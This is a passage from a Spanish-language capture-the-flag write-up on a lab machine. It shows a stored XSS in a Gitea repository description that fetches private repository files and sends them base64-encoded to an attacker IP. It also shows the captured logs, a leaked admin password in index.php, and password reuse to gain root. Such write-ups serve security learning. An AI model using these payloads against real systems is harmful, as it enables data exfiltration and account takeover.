We are currently developing an employee management system. Each sector administrator will be assigned a specific role, while each employee will be able to consult their assigned tasks. The project is still under development and is hosted in our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md
~~~

Se menciona que el equipo se encuentra trabajando en un sistema de gestión de empleados. Se nos comparte la URL del repositorio, sin embargo no tenemos acceso directamente con el usuario `axel`

### Exploiting

Sabiendo esto, nuestro siguiente objetivo será ver los archivos del repositorio `Employee-management`. 

Primeramente modificaremos el `payload` para enviar el contenido del archivo `README.md` del proyecto mencionado. Editaremos el repositorio o crearemos uno nuevo para que la descripción contenga algo como lo siguiente

> Para recibir el contenido de este archivo, enviaremos un correo electrónico a `jobert` para que haga clic en la descripción de nuestro repositorio y nos envíe el contenido que buscamos.
{: .notice--warning}

~~~ bash
<a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md").then(response=>response.text()).then(data=>fetch("http://10.10.14.180/?data="+btoa(data)));'>Click here!</a>
~~~

Ejecutaremos los comandos anteriores para hacer el primer `commit` al repositorio y que quede inicializado correctamente

~~~ bash
touch README.md
git init
git checkout -b main
git add README.md
git commit -m "first commit"
git remote add origin http://localhost:3000/axel/Test.git
git push -u origin main
~~~

Para recibir el contenido que esperamos, iniciaremos un servidor HTTP 

~~~ bash
python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~

### Sending Mail to `jobert`

Podemos enviar el correo a `jobert` de la siguiente forma utilizando el comando `sendmail`

~~~ bash
axel@cat:~$ echo 'http://localhost:3000/axel/Test' | sendmail jobert@localhost
~~~

Recibiremos una cadena en `base64` desde la máquina victima, esto indica que funcionó el XSS

~~~ bash
10.10.11.53 - - [05/Jul/2025 19:02:09] "GET /?data=IyBFbXBsb3llZSBNYW5hZ2VtZW50ClNpdGUgdW5kZXIgY29uc3RydWN0aW9uLiBBdXRob3JpemVkIHVzZXI6IGFkbWluLiBObyB2aXNpYmlsaXR5IG9yIHVwZGF0ZXMgdmlzaWJsZSB0byBlbXBsb3llZXMu HTTP/1.1" 200 -
~~~

Decodificaremos la cadena desde `base64` para verla en texto claro

~~~ bash
echo 'IyBFbXBsb3llZSBNYW5hZ2VtZW50ClNpdGUgdW5kZXIgY29uc3RydWN0aW9uLiBBdXRob3JpemVkIHVzZXI6IGFkbWluLiBObyB2aXNpYmlsaXR5IG9yIHVwZGF0ZXMgdmlzaWJsZSB0byBlbXBsb3llZXMu' | base64 -d; echo

# Employee Management
Site under construction. Authorized user: admin. No visibility or updates visible to employees.
~~~


## Credentials Leakage

Modificaremos el `payload` para ver archivos comunes como `index.php`, `config.php` o `admin.php`. Replicaremos los pasos donde solamente cambia el archivo al que apuntaremos

~~~ html
<a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php").then(response=>response.text()).then(data=>fetch("http://10.10.14.180/?data="+btoa(data)));'>Click here!</a>
~~~

Una vez hayamos repetido el proceso, recibiremos una cadena en `base64` con aspecto más largo que la anterior

~~~ bash
10.10.11.53 - - [05/Jul/2025 19:16:18] "GET /?data=PD9waHAKJHZhbGlkX3VzZXJuYW1lID0gJ2FkbWluJzsKJHZhbGlkX3Bhc3N3b3JkID0gJ0lLdzc1ZVIwTVI3Q01JeGhIMCc7CgppZiAoIWlzc2V0KCRfU0VSVkVSWydQSFBfQVVUSF9VU0VSJ10pIHx8ICFpc3NldCgkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSkgfHwgCiAgICAkX1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddICE9ICR2YWxpZF91c2VybmFtZSB8fCAkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSAhPSAkdmFsaWRfcGFzc3dvcmQpIHsKICAgIAogICAgaGVhZGVyKCdXV1ctQXV0aGVudGljYXRlOiBCYXNpYyByZWFsbT0iRW1wbG95ZWUgTWFuYWdlbWVudCInKTsKICAgIGhlYWRlcignSFRUUC8xLjAgNDAxIFVuYXV0aG9yaXplZCcpOwogICAgZXhpdDsKfQoKaGVhZGVyKCdMb2NhdGlvbjogZGFzaGJvYXJkLnBocCcpOwpleGl0Owo/PgoK HTTP/1.1" 200 -
~~~

Al decodificarla, veremos el contenido del archivo `index.php`. Veremos unas credenciales supuestamente para un usuario `admin`

~~~ bash
echo 'PD9waHAKJHZhbGlkX3VzZXJuYW1lID0gJ2FkbWluJzsKJHZhbGlkX3Bhc3N3b3JkID0gJ0lLdzc1ZVIwTVI3Q01JeGhIMCc7CgppZiAoIWlzc2V0KCRfU0VSVkVSWydQSFBfQVVUSF9VU0VSJ10pIHx8ICFpc3NldCgkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSkgfHwgCiAgICAkX1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddICE9ICR2YWxpZF91c2VybmFtZSB8fCAkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSAhPSAkdmFsaWRfcGFzc3dvcmQpIHsKICAgIAogICAgaGVhZGVyKCdXV1ctQXV0aGVudGljYXRlOiBCYXNpYyByZWFsbT0iRW1wbG95ZWUgTWFuYWdlbWVudCInKTsKICAgIGhlYWRlcignSFRUUC8xLjAgNDAxIFVuYXV0aG9yaXplZCcpOwogICAgZXhpdDsKfQoKaGVhZGVyKCdMb2NhdGlvbjogZGFzaGJvYXJkLnBocCcpOwpleGl0Owo/PgoK' | base64 -d;echo

<?php
$valid_username = 'admin';
$valid_password = 'IKw75eR0MR7CMIxhH0';

if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) || 
    $_SERVER['PHP_AUTH_USER'] != $valid_username || $_SERVER['PHP_AUTH_PW'] != $valid_password) {
    
    header('WWW-Authenticate: Basic realm="Employee Management"');
    header('HTTP/1.0 401 Unauthorized');
    exit;
}

header('Location: dashboard.php');
exit;
?>
~~~


## Root Time

Según la información que hemos recolectado, no existe un usuario `admin`. Intentando iniciar sesión como `root` en la máquina víctima, obtendremos acceso privilegiado

~~~ bash
axel@cat:~$ su root
Password:
root@cat:/home/axel# id
uid=0(root) gid=0(root) groups=0(root)
~~~

Solo nos quedaría ver la última flag ubicada en el directorio `/root`

~~~ bash
root@cat:/home/axel# cd
root@cat:/home/axel# cat root.txt 
8f4...
~~~
<br>
Gracias por leer este artículo, espero te haya sido de ayuda. Te dejo la cita del día:

> It is not enough to have a good mind; the main thing is to use it well.
> — Rene Descartes
{: .notice--info}
